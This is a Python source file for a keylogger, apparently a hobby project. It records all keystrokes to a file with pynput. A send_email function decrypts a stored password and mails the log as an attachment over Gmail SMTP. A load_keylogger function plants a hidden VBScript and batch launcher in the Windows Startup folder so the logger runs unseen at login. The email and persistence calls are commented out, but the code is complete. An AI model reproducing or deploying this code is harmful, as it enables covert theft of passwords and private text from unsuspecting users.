import datetime
import getpass
import os
import smtplib
import time

from cryptography.fernet import Fernet
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase

from pynput.keyboard import Listener
from signal import signal, SIGINT
from sys import exit

from pass_encryptation import load_key, ENC_PASS_FILENAME


def key_listener():

    def signal_handler(signal, frame):
        print('Exiting keylogger ...')
        file.close()
        exit()

    def key_recorder(key):
        key = str(key)

        if key == 'Key.enter':
            file.write('\n')
        elif key == 'Key.space':
            file.write(' ')
        elif key == 'Key.backspace':
            file.write('%BORRAR%')
        else:
            file.write(key.replace("'", ""))

        if time.time()-t0 > 60:
            # TODO: free the input
            file.close()
            # send_email(file_name)
            exit()
        
    signal(SIGINT, signal_handler)

    date = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')

    file_name = 'test_keylogger_{}.txt'.format(date)
    file = open(file_name, 'w')

    t0 = time.time()

    with Listener(on_press=key_recorder) as l:
        l.join()


def send_email(file_name):
    key = load_key()
    fernet_key = Fernet(key)
    enc_pass = (open('pass.enc','rb').read())
    password = fernet_key.decrypt((enc_pass)).decode()

    msg = MIMEMultipart()
    text = 'Testing keylogger, see file attached.'
    msg['From'] = '#######'
    msg['To'] = '#######'
    msg['Subject'] = 'Keylogger test'
    msg.attach(MIMEText(text, 'plain'))

    attachment_content = open(file_name, 'r')
    
    attached_file = MIMEBase('application', 'octet-stream')
    attached_file.set_payload((attachment_content).read())
    attached_file.add_header('Content-Disposition', "attachment; filename= %s" % str(file_name))
    msg.attach(attached_file)

    server = smtplib.SMTP('smtp.gmail.com: 587')
    server.starttls()
    server.login(msg['From'], password)
    server.sendmail(msg['From'], msg['To'], msg.as_string())
    server.quit()


def load_keylogger():
    USER_NAME = getpass.getuser()
    # TODO: Make it functional for Linux users too
    final_path = 'C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'.format(USER_NAME)
    path_script = os.path.dirname(os.path.abspath(__file__))

    # TODO: what is a bat file?
    with open('open.bat', 'w+') as bat_file:
        bat_file.write('cd "{}"\n'.format(path_script))
        # TODO: Make it functional no matter what python version do you have
        # TODO: Make that the program compiles automatically to an executable
        bat_file.write('python "keylogger.py"')

    with open(final_path+'\\'+"open.vbs", "w+") as vbs_file:
        vbs_file.write('Dim WinScriptHost\n')
        vbs_file.write('Set WinScriptHost = CreateObject("WScript.Shell")\n')
        vbs_file.write('WinScriptHost.Run Chr(34) & "{}\open.bat" & Chr(34), 0\n'.format(path_script))
        vbs_file.write('Set WinScriptHost = Nothing\n')




if __name__ == '__main__':
    # load_keylogger()
    key_listener()
